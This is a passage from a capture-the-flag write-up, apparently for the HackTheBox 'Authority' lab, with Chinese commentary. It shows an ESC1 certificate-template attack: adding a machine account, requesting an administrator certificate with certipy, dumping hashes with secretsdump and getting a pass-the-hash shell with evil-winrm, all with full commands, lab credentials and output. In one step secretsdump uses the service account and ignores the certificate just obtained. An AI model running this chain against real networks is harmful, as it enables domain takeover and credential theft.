[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

CorpVPN 容易受到 ESC1 攻击。

Ldapsearch 查询到机器账户默认配额是 10。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ LDAPTLS_REQCERT=never ldapsearch -x -LLL -H ldaps://10.129.229.56:636 \
  -D 'CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb' \
  -w 'lDaP_1n_th3_cle4r!' \
  -b 'DC=authority,DC=htb' -s base '(objectClass=*)' ms-DS-MachineAccountQuota
dn: DC=authority,DC=htb
ms-DS-MachineAccountQuota: 10
```

新建一个 `PC01$`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ impacket-addcomputer -computer-name 'PC01$' -computer-pass 'Enil222' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'                             
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account PC01$ with password Enil222.
```

nxc 查询到 administrator 的 sid。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ nxc ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --query "(sAMAccountName=administrator)" "objectSid"
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
LDAP        10.129.229.56   389    AUTHORITY        [+] Response for object: CN=Administrator,CN=Users,DC=authority,DC=htb
LDAP        10.129.229.56   389    AUTHORITY        objectSid            S-1-5-21-622327497-3269355298-2248959698-500
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ nxc smb 10.129.229.56 -u 'PC01$' -p 'Enil222'
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\PC01$:Enil222
```

使用刚创建的 `PC01$` 签出证书。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ certipy-ad req -u 'PC01$@authority.htb' -p 'Enil222' -dc-ip 10.129.229.56 -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate object SID is 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename):
[*] Wrote certificate and private key to 'administrator_f55f343f-f851-47b4-aa5d-55d6841d803e.pfx'
```

administrator 的 NT hash 到手。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ impacket-secretsdump 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!@10.129.229.56' -just-dc-user administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
[*] Cleaning up...
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ nxc winrm 10.129.229.56 -u administrator -H 6961f422924da90a6928197429eea4ed
WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\administrator:6961f422924da90a6928197429eea4ed (Pwn3d!)
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ evil-winrm -i 10.129.229.56 -u administrator -H 6961f422924da90a6928197429eea4ed
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```